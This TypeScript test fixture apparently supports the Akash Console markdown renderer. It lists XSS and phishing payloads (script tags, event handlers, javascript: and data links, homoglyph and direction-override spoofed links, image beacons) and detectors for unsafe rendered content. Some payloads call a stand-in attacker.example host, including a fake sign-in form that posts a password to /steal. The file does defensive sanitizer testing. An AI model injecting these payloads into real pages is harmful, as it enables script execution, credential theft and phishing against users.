import { toLoadableUserContentImageUrl } from "@src/components/shared/UserContentMarkdown/userContentImageSources";

export interface UserContentAttack {
  name: string;
  payload: string;
}

export const ATTACKER_HOST = "attacker.example";

export const IMPERSONATED_HOST = "console.akash.network";

const LOADABLE_IMAGE = "https://raw.githubusercontent.com/attacker/repo/main/deploy-button.png";

export const MARKUP_ATTACKS: UserContentAttack[] = [
  { name: "a script element", payload: '<script>alert("xss")</script>' },
  { name: "a script that closes an attribute first", payload: '"><script>alert(1)</script>' },
  { name: "an image with an error handler", payload: "<img src=x onerror=alert(1)>" },
  { name: "an image beacon in raw HTML", payload: `<img src="https://${ATTACKER_HOST}/pixel.gif">` },
  { name: "an svg with a load handler", payload: "<svg onload=alert(1)></svg>" },
  { name: "an svg script link", payload: '<svg><a xlink:href="javascript:alert(1)"><text>click</text></a></svg>' },
  { name: "a math element hiding a script", payload: "<math><mtext><script>alert(1)</script></mtext></math>" },
  { name: "a frame running a script", payload: '<iframe src="javascript:alert(1)"></iframe>' },
  { name: "a frame with an inline document", payload: '<iframe srcdoc="<script>alert(1)</script>"></iframe>' },
  { name: "an anchor running a script", payload: '<a href="javascript:alert(1)">click</a>' },
  { name: "an anchor laid over the page", payload: `<a href="https://${ATTACKER_HOST}" style="position:fixed;inset:0">Continue</a>` },
  { name: "a style sheet", payload: "<style>body{display:none}</style>" },
  { name: "a linked style sheet", payload: `<link rel="stylesheet" href="https://${ATTACKER_HOST}/x.css">` },
  {
    name: "a sign-in form",
    payload: `<form action="https://${ATTACKER_HOST}/steal"><input name="password"><button type="submit">Sign in</button></form>`
  },
  { name: "a field that grabs the focus", payload: "<input autofocus onfocus=alert(1)>" },
  { name: "a meta refresh", payload: `<meta http-equiv="refresh" content="0;url=https://${ATTACKER_HOST}">` },
  { name: "a base address", payload: `<base href="https://${ATTACKER_HOST}/">` },
  { name: "an embedded object", payload: `<object data="https://${ATTACKER_HOST}/x.swf"></object><embed src="https://${ATTACKER_HOST}/x.swf">` },
  { name: "a video with an error handler", payload: "<video><source onerror=alert(1)></video>" },
  { name: "a details element with a toggle handler", payload: "<details open ontoggle=alert(1)><summary>More</summary></details>" },
  { name: "a body with a load handler", payload: "<body onload=alert(1)>" },
  { name: "a script inside a comment", payload: "<!--<img src=x onerror=alert(1)>-->" },
  { name: "an entity-encoded script", payload: "&lt;script&gt;alert(1)&lt;/script&gt;" },
  { name: "a template expression", payload: "{{constructor.constructor('alert(1)')()}}" },
  { name: "a bare script address", payload: "javascript:alert(1)" }
];

export const MARKDOWN_ATTACKS: UserContentAttack[] = [
  { name: "a script link", payload: "[click](javascript:alert(1))" },
  { name: "a script link in mixed case", payload: "[click](JaVaScRiPt:alert(1))" },
  { name: "a script link in angle brackets", payload: "[click](<javascript:alert(1)>)" },
  { name: "a script link behind an entity", payload: "[click](&#106;avascript:alert(1))" },
  { name: "a script link by reference", payload: "[click][x]\n\n[x]: javascript:alert(1)" },
  { name: "a script autolink", payload: "<javascript:alert(1)>" },
  { name: "a data link", payload: "[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)" },
  { name: "a vbscript link", payload: "[click](vbscript:msgbox(1))" },
  { name: "a link with attribute syntax", payload: `[click](https://${ATTACKER_HOST}){onclick=alert(1)}` },
  { name: "a link to a Console route", payload: "[Add credits](/api/auth/logout)" },
  { name: "a link without a scheme", payload: `[Add credits](//${ATTACKER_HOST}/billing)` },
  { name: "a link labelled as a Console page", payload: `[https://${IMPERSONATED_HOST}/billing](https://${ATTACKER_HOST}/billing)` },
  { name: "a link labelled as the Console host", payload: `[${IMPERSONATED_HOST}](https://${IMPERSONATED_HOST}.${ATTACKER_HOST}/)` },
  { name: "a link with the Console host as its user name", payload: `[Sign in](https://${IMPERSONATED_HOST}@${ATTACKER_HOST}/)` },
  { name: "a link labelled through zero-width characters", payload: `[console.akash\u200b.network](https://${ATTACKER_HOST}/)` },
  { name: "a link labelled right to left", payload: `[\u202ekrowten.hsaka.elosnoc//:sptth](https://${ATTACKER_HOST}/)` },
  { name: "a link to a look-alike host", payload: "[c\u043ensole.akash.network](https://c\u043ensole.akash.network/)" },
  { name: "a link with a misleading title", payload: `[Docs](https://${ATTACKER_HOST}/ "https://${IMPERSONATED_HOST}/docs")` },
  { name: "an image drawn as a Console button", payload: `[![Deploy](${LOADABLE_IMAGE})](https://${ATTACKER_HOST}/phish)` },
  { name: "an image beacon", payload: `![tracker](https://${ATTACKER_HOST}/pixel.gif)` },
  { name: "an image beacon without a scheme", payload: `![tracker](//${ATTACKER_HOST}/pixel.gif)` },
  { name: "an image beacon inside a link", payload: `[![tracker](https://${ATTACKER_HOST}/pixel.gif)](https://${ATTACKER_HOST}/)` },
  { name: "an image over plain http", payload: "![logo](http://raw.githubusercontent.com/attacker/repo/main/logo.png)" },
  { name: "an image from a host that extends a listed one", payload: `![logo](https://raw.githubusercontent.com.${ATTACKER_HOST}/logo.png)` },
  { name: "an image with a listed host as its user name", payload: `![logo](https://raw.githubusercontent.com@${ATTACKER_HOST}/logo.png)` },
  { name: "an image from another port of a listed host", payload: "![logo](https://raw.githubusercontent.com:8443/attacker/repo/main/logo.png)" },
  { name: "an image that calls a Console route", payload: "![logout](/api/auth/logout)" },
  { name: "an image that starts a GitHub sign-in", payload: "![logo](https://github.com/login/oauth/authorize?client_id=attacker)" },
  { name: "an image that climbs out of a listed path", payload: "![logo](https://github.com/attacker/repo/raw/../../../login/oauth/authorize)" },
  { name: "a script image", payload: "![logo](javascript:alert(1))" },
  { name: "a data image", payload: "![logo](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)" },
  { name: "an image whose alt closes the attribute", payload: `![logo" onerror="alert(1)](${LOADABLE_IMAGE})` }
];

export const USER_CONTENT_ATTACKS: UserContentAttack[] = [...MARKUP_ATTACKS, ...MARKDOWN_ATTACKS];

const ACTIVE_ELEMENTS = [
  "script",
  "iframe",
  "frame",
  "object",
  "embed",
  "applet",
  "style",
  "link",
  "meta",
  "base",
  "form",
  "math",
  "video",
  "audio",
  "source",
  "track",
  "picture",
  "template",
  "noscript",
  "foreignObject"
].join(",");

const ACTIVE_ATTRIBUTES = ["srcdoc", "srcset", "formaction", "ping", "background"];

const ADDRESS_ATTRIBUTES = ["href", "src", "action", "poster", "data", "xlink:href"];

const PASSIVE_SCHEMES = ["http:", "https:", "mailto:"];

const USER_LINK_REL = ["ugc", "nofollow", "noopener", "noreferrer"];

const DIRECTION_OVERRIDES = /[\u202a-\u202e\u2066-\u2069]/;

const INVISIBLE_CHARACTERS = /[\p{Cf}\p{Default_Ignorable_Code_Point}]/gu;

export function findActiveContent(container: Element): string[] {
  const elements = Array.from(container.querySelectorAll("*"));

  return [
    ...Array.from(container.querySelectorAll(ACTIVE_ELEMENTS)).map(element => `<${element.localName}> element`),
    ...elements.flatMap(element =>
      element
        .getAttributeNames()
        .filter(name => name.startsWith("on") || ACTIVE_ATTRIBUTES.includes(name))
        .map(name => `${name} attribute on <${element.localName}>`)
    ),
    ...elements.flatMap(element =>
      ADDRESS_ATTRIBUTES.filter(name => element.hasAttribute(name) && !hasPassiveAddress(element.getAttribute(name)!)).map(
        name => `${name}="${element.getAttribute(name)}" on <${element.localName}>`
      )
    ),
    ...Array.from(container.querySelectorAll("img"))
      .filter(image => toLoadableUserContentImageUrl(image.getAttribute("src")) === undefined)
      .map(image => `image fetched from ${image.getAttribute("src")}`)
  ];
}

export function findUnsafeUserLinks(container: Element): string[] {
  const links = Array.from(container.querySelectorAll("a"));
  const issuesOf = (link: HTMLAnchorElement, issues: Array<string | false>) => issues.filter(Boolean).map(issue => `${issue}: ${link.outerHTML}`);

  return [
    ...links.flatMap(link =>
      issuesOf(link, [
        !isAbsolutePassiveAddress(link.getAttribute("href")) && "link that is not an absolute http(s) or mailto address",
        link.getAttribute("target") !== "_blank" && "link that opens in the same tab",
        !USER_LINK_REL.every(token => link.relList.contains(token)) && "link not marked as user content",
        link.querySelector("img") !== null && "link drawn as an image",
        link.hasAttribute("title") && "link with a title",
        mentionsImpersonatedHost(link) && hostOf(link.getAttribute("href")) !== IMPERSONATED_HOST && "link labelled as Console that goes elsewhere"
      ])
    ),
    ...(DIRECTION_OVERRIDES.test(container.textContent ?? "") ? ["text that overrides its reading direction"] : [])
  ];
}

function hasPassiveAddress(address: string): boolean {
  const scheme = /^\s*([a-z][a-z0-9+.-]*:)/i.exec(address)?.[1].toLowerCase();

  return scheme === undefined || PASSIVE_SCHEMES.includes(scheme);
}

function isAbsolutePassiveAddress(address: string | null): boolean {
  return /^(?:https?:\/\/|mailto:)/.test(address ?? "");
}

function mentionsImpersonatedHost(link: HTMLAnchorElement): boolean {
  const label = Array.from(link.childNodes)
    .filter(node => !(node instanceof Element && node.getAttribute("aria-hidden") === "true"))
    .map(node => node.textContent)
    .join("");

  return label !== link.getAttribute("href") && label.normalize("NFKC").replace(INVISIBLE_CHARACTERS, "").toLowerCase().includes(IMPERSONATED_HOST);
}

function hostOf(address: string | null): string | undefined {
  try {
    return new URL(address ?? "").hostname;
  } catch {
    return undefined;
  }
}
